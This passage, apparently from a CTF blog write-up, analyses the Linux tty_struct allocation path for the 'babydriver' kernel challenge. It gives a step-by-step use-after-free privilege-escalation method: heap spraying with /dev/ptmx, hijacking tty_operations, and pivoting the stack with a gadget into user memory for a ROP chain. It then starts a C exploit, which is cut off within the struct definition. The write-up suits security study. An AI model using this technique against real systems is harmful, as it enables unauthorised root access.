rel="noopener">https://blog.csdn.net/liushuimpc/article/details/51610941</a></p><p>调试时，发现ptmx打开的函数调用路径如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► f 0 ffffffff81507e50 ptmx_open</span><br><span class="line">  f 1 ffffffff8120acbf chrdev_open+191</span><br><span class="line">  f 2 ffffffff81203e1f do_dentry_open+511</span><br><span class="line">  f 3 ffffffff812052f4 vfs_open+84</span><br><span class="line">  f 4 ffffffff81214587 path_openat+439</span><br><span class="line">  f 5 ffffffff81214587 path_openat+439</span><br><span class="line">  f 6 ffffffff812168f1 do_filp_open+145</span><br><span class="line">  f 7 ffffffff812056ca do_sys_open+314</span><br><span class="line">  f 8 ffffffff812057de sys_open+30</span><br><span class="line">  f 9 ffffffff812057de sys_open+30</span><br><span class="line">  f 10 ffffffff8183d259 entry_SYSCALL_64+137</span><br></pre></td></tr></table></figure><p>最终执行了ptmx_open函数，这个函数在<strong>\drivers\tty\pty.c 的734行</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ptmx_open</span><span class="params">(struct inode *inode, struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pts_fs_info</span> *<span class="title">fsi</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">slave_inode</span>;</span></span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"><span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">nonseekable_open(inode, filp);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We refuse fsnotify events on ptmx, since it's a shared resource */</span></span><br><span class="line">filp-&gt;f_mode |= FMODE_NONOTIFY;</span><br><span class="line"></span><br><span class="line">retval = tty_alloc_file(filp);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">fsi = devpts_get_ref(inode, filp);</span><br><span class="line">retval = -ENODEV;</span><br><span class="line"><span class="keyword">if</span> (!fsi)</span><br><span class="line"><span class="keyword">goto</span> out_free_file;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* find a device that is not in use. */</span></span><br><span class="line">mutex_lock(&amp;devpts_mutex);</span><br><span class="line">index = devpts_new_index(fsi);</span><br><span class="line">mutex_unlock(&amp;devpts_mutex);</span><br><span class="line"></span><br><span class="line">retval = index;</span><br><span class="line"><span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out_put_ref;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;tty_mutex);</span><br><span class="line">--&gt;tty = tty_init_dev(ptm_driver, index);</span><br><span class="line"><span class="comment">/* The tty returned here is locked so we can safely</span></span><br><span class="line"><span class="comment">   drop the mutex */</span></span><br><span class="line">mutex_unlock(&amp;tty_mutex);</span><br><span class="line"></span><br><span class="line">retval = PTR_ERR(tty);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tty))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * From here on out, the tty is "live", and the index and</span></span><br><span class="line"><span class="comment"> * fsi will be killed/put by the tty_release()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">set_bit(TTY_PTY_LOCK, &amp;tty-&gt;flags); <span class="comment">/* LOCK THE SLAVE */</span></span><br><span class="line">tty-&gt;driver_data = fsi;</span><br><span class="line"></span><br><span class="line">tty_add_file(tty, filp);</span><br><span class="line"></span><br><span class="line">slave_inode = devpts_pty_new(fsi,</span><br><span class="line">MKDEV(UNIX98_PTY_SLAVE_MAJOR, index), index,</span><br><span class="line">tty-&gt;link);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(slave_inode)) &#123;</span><br><span class="line">retval = PTR_ERR(slave_inode);</span><br><span class="line"><span class="keyword">goto</span> err_release;</span><br><span class="line">&#125;</span><br><span class="line">tty-&gt;link-&gt;driver_data = slave_inode;</span><br><span class="line"></span><br><span class="line">retval = ptm_driver-&gt;ops-&gt;open(tty, filp);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line"><span class="keyword">goto</span> err_release;</span><br><span class="line"></span><br><span class="line">tty_debug_hangup(tty, <span class="string">"(tty count=%d)\n"</span>, tty-&gt;count);</span><br><span class="line"></span><br><span class="line">tty_unlock(tty);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_release:</span><br><span class="line">tty_unlock(tty);</span><br><span class="line"><span class="comment">// This will also put-ref the fsi</span></span><br><span class="line">tty_release(inode, filp);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">out:</span><br><span class="line">devpts_kill_index(fsi, index);</span><br><span class="line">out_put_ref:</span><br><span class="line">devpts_put_ref(fsi);</span><br><span class="line">out_free_file:</span><br><span class="line">tty_free_file(filp);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关心的重点是在tty_struct这个堆空间是在哪里分配的，可以看到struct tty_struct *tty的赋值在767行 <strong><em>tty = tty_init_dev(ptm_driver, index);</em></strong>，该函数在<strong>\drivers\\tty\\tty_io.c 的1506行</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct tty_struct *<span class="title">tty_init_dev</span><span class="params">(struct tty_driver *driver, <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * First time open is complex, especially for PTY devices.</span></span><br><span class="line"><span class="comment"> * This code guarantees that either everything succeeds and the</span></span><br><span class="line"><span class="comment"> * TTY is ready for operation, or else the table slots are vacated</span></span><br><span class="line"><span class="comment"> * and the allocated memory released.  (Except that the termios</span></span><br><span class="line"><span class="comment"> * and locked termios may be retained.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(driver-&gt;owner))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENODEV);</span><br><span class="line"></span><br><span class="line">--&gt;tty = alloc_tty_struct(driver, idx);</span><br><span class="line"><span class="keyword">if</span> (!tty) &#123;</span><br><span class="line">retval = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err_module_put;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tty_lock(tty);</span><br><span class="line">retval = tty_driver_install_tty(driver, tty);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_deinit_tty;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!tty-&gt;port)</span><br><span class="line">tty-&gt;port = driver-&gt;ports[idx];</span><br><span class="line"></span><br><span class="line">WARN_RATELIMIT(!tty-&gt;port,</span><br><span class="line"><span class="string">"%s: %s driver does not set tty-&gt;port. This will crash the kernel later. Fix the driver!\n"</span>,</span><br><span class="line">__func__, tty-&gt;driver-&gt;name);</span><br><span class="line"></span><br><span class="line">tty-&gt;port-&gt;itty = tty;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Structures all installed ... call the ldisc open routines.</span></span><br><span class="line"><span class="comment"> * If we fail here just call release_tty to clean up.  No need</span></span><br><span class="line"><span class="comment"> * to decrement the use counts, as release_tty doesn't care.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">retval = tty_ldisc_setup(tty, tty-&gt;link);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line"><span class="keyword">goto</span> err_release_tty;</span><br><span class="line"><span class="comment">/* Return the tty locked so that it cannot vanish under the caller */</span></span><br><span class="line"><span class="keyword">return</span> tty;</span><br><span class="line"></span><br><span class="line">err_deinit_tty:</span><br><span class="line">tty_unlock(tty);</span><br><span class="line">deinitialize_tty_struct(tty);</span><br><span class="line">free_tty_struct(tty);</span><br><span class="line">err_module_put:</span><br><span class="line">module_put(driver-&gt;owner);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(retval);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* call the tty release_tty routine to clean out this slot */</span></span><br><span class="line">err_release_tty:</span><br><span class="line">tty_unlock(tty);</span><br><span class="line">printk_ratelimited(KERN_INFO <span class="string">"tty_init_dev: ldisc open failed, "</span></span><br><span class="line"> <span class="string">"clearing slot %d\n"</span>, idx);</span><br><span class="line">release_tty(tty, idx);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(retval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而其中，1522行调用了alloc_tty_struct(driver, idx)函数，最终可以看到在tty_io.c中的3140行，调用了kzalloc申请了sizeof(*tty)大小的堆空间，这也是题目中UAF堆块的由来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct tty_struct *<span class="title">alloc_tty_struct</span><span class="params">(struct tty_driver *driver, <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line"></span><br><span class="line">tty = kzalloc(<span class="keyword">sizeof</span>(*tty), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!tty)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kref_init(&amp;tty-&gt;kref);</span><br><span class="line">tty-&gt;magic = TTY_MAGIC;</span><br><span class="line">tty_ldisc_init(tty);</span><br><span class="line">tty-&gt;session = <span class="literal">NULL</span>;</span><br><span class="line">tty-&gt;pgrp = <span class="literal">NULL</span>;</span><br><span class="line">mutex_init(&amp;tty-&gt;legacy_mutex);</span><br><span class="line">mutex_init(&amp;tty-&gt;throttle_mutex);</span><br><span class="line">init_rwsem(&amp;tty-&gt;termios_rwsem);</span><br><span class="line">mutex_init(&amp;tty-&gt;winsize_mutex);</span><br><span class="line">init_ldsem(&amp;tty-&gt;ldisc_sem);</span><br><span class="line">init_waitqueue_head(&amp;tty-&gt;write_wait);</span><br><span class="line">init_waitqueue_head(&amp;tty-&gt;read_wait);</span><br><span class="line">INIT_WORK(&amp;tty-&gt;hangup_work, do_tty_hangup);</span><br><span class="line">mutex_init(&amp;tty-&gt;atomic_write_lock);</span><br><span class="line">spin_lock_init(&amp;tty-&gt;ctrl_lock);</span><br><span class="line">spin_lock_init(&amp;tty-&gt;flow_lock);</span><br><span class="line">INIT_LIST_HEAD(&amp;tty-&gt;tty_files);</span><br><span class="line">INIT_WORK(&amp;tty-&gt;SAK_work, do_SAK_work);</span><br><span class="line"></span><br><span class="line">tty-&gt;driver = driver;</span><br><span class="line">tty-&gt;ops = driver-&gt;ops;</span><br><span class="line">tty-&gt;index = idx;</span><br><span class="line">tty_line_name(driver, idx, tty-&gt;name);</span><br><span class="line">tty-&gt;dev = tty_get_device(tty);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> tty;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而kzalloc定义在<strong>\include\linux\slab.h</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">kzalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> kmalloc(size, flags | __GFP_ZERO);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实还是kmalloc…，定义在<strong>\include\linux\slab.h 446行</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __<span class="function">always_inline <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line"><span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; GFP_DMA)) &#123;</span><br><span class="line"><span class="keyword">int</span> index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!index)</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> kmem_cache_alloc_trace(kmalloc_caches[index],</span><br><span class="line">flags, size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于UAF我当成还有另外一个想法，就是tty-&gt;ops如果也是通过kmalloc出来的，直接劫持虚表不是更好，不过显然不是。。。</p><h3 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h3><p><strong>0 此题没有开kaslr是本方法可以简易使用的必要条件</strong></p><p><strong>1 打开两个babydev设备，对其中一个设备使用ioctl命令，将size设置为tty_struct的大小，大小是0x2e0，但slab是一个以2对齐的结构，因此0x400以下，0x200以上应该都可以：</strong></p><p><img src="/img/babydriver/4.png" alt=""></p><p><strong>2 将其中一个设备释放掉，此时另外一个设备存在一个大小为0x400的被释放堆块。</strong></p><p><strong>3 使用open(“/dev/ptmx”, O_RDWR | O_NOCTTY)，进行堆喷射，使未关闭的babydev的指针指向一个tty_struct</strong></p><p><strong>4 对于如何拿到控制权，可以使用内核栈迁移的方法，利用如xchg esp , e?x的gadget，使内核栈迁移到一个可控制的低内存空间，即用户态空间。原因是在执行该指令时，寄存器的高8字节会被置为0。而在驱动中，调用tty_operations操作的最后一条汇编指令是call rax。因此，选择xchg esp,eax指令来做。</strong></p><p>关于寻找内核的gadget，经过M4X师傅的分享，我放弃了ROPgadget，选择了<a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">ropper</a>，速度比ROPgadget快许多。</p><p>如：</p><p><img src="/img/babydriver/6.png" alt=""></p><p><strong>5 当我们可以迁移内核栈到用户态，且栈地址可以预测，则可利用mmap将这个地址申请下来，再填充ROP。ROP代码可以参考<a href="http://p4nda.top/2018/07/13/ciscn2018-core/">之前的文章</a>。</strong></p><p><strong>6 通过题目中给的babyread和babywrite，将tty_struct的*op指针指向一个用户态空间，空间中将这个虚表的ioctl指针指向找到的栈迁移gadget</strong></p><p><strong>7 最终对之前open的/dev/ptmx进行ioctl操作就可以提权了</strong></p><p>最终实验过程，我没有使用tty_struct的0x2e0大小，选用了0x3e0大小，同样可以触发漏洞，最终结果如下：</p><p><img src="/img/babydriver/5.png" alt=""></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">tty_operations</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">inode</span> *<span class="title">inode</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line"><span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line"><span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line"><span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line"><span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line"><span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line"><span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line"><span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line"><span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line"><span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line"><span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line"><span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line"><span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line"><span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line"><span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line"><span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line"><span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line"><span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">struct serial_icounter_struct *icount);</span><br><span class="line"><span class="class"><span 